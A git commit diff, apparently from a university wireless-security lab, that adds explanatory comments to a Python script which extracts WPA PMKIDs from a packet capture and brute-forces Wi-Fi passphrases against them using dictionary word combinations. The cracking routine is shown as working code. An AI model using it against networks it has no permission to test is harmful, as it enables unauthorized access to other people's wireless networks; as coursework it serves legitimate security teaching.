0cb398370c67147d0383ef6dbab91fc29c6b401c
nathan.seville <nathan.seville@hotmail.ch>
2020-05-04 13:44:15 +0200

    Add comments to code

--- files/pmkids.py
+++ files/pmkids.py
@@ -8,6 +8,14 @@ from pbkdf2 import *
 import hmac, hashlib
 import itertools
 
+'''
+Authors: Julien Quartier & Nathan Séville
+Date: 04.05.2020
+Description: PMKID bruteforce with dictionnary
+
+Overall code is based on previous lab (WPA)
+'''
+
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap('PMKID_handshake.pcap') 
 
@@ -25,6 +33,7 @@ def findSSID(packets, apmac):
             if packet.ID == 0: # SSID
                 return packet.info.decode()
 
+# Return the PMKIDs found in packets for each SSIDs found in packets. Station mac and ap mac are attached with pmkid as they're used for it's computations (as well as ssid used as map key)
 def findPMKIDs(packets):
     PMKIDs = {}
 
@@ -36,21 +45,25 @@ def findPMKIDs(packets):
 
     return PMKIDs
 
+# Create combinations of n-words in dictionnary.
 def wordCombinations(words, n):
     return list(itertools.combinations(words, n))
 
+# Compute PMKID given the key, ssid, station mac and ap mac. Method of computation come from SWI course.
 def PMKID(key, ssid, staMAC, apMAC):
     key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
     return hmac.new(key,str.encode('PMK Name')+apMAC+staMAC,hashlib.sha1).digest()[:16]
 
-# Read dictionnary words
+# Read dictionnary words.
 words = [line.rstrip() for line in open('wordlist.txt', 'r')]
 
-# Max combinations of words
+# Max combinations of words, for admin123 enter 4 (admin-1-2-3).
 maxc = int(input("Enter maximum words combinations [Int]: "))
 
+# Get the APs PMKIDs.
 APs = findPMKIDs(wpa)
 
+# Bruteforce each APs PMKID with dictionnary word combinations.
 for ssid in APs:
     for i in range(1, maxc+1):
         for key in wordCombinations(words, i):
